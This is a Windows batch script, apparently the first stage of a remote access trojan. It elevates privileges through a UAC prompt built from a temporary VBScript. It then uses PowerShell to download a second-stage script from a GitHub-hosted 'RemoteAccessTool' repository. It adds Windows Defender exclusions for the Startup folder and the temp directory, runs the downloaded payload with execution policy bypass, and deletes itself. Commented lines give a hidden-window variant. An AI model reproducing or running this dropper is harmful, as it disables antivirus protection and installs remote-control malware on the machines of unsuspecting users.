REM hide commands as they execute.
@echo off

:: BatchGotAdmin
:-------------------------------------
REM  check for permissions.
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM if error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

REM attempt to elevate admin priv.
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

REM a VBScript to prompt for admin rights, then delete itself.
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

REM rat resources
REM ; to execute quicker

powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/refs/heads/main/payloads/stage2.ps1 -OutFile stage2.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
powershell powershell.exe -ep bypass -debug ./stage2.ps1

REM powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/tarasermolenko/RemoteAccessTool/refs/heads/main/payloads/stage2.ps1 -OutFile stage2.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
REM powershell powershell.exe -windowstyle hidden -ep bypass ./stage2.ps1

@REM self delete
del stage1.cmd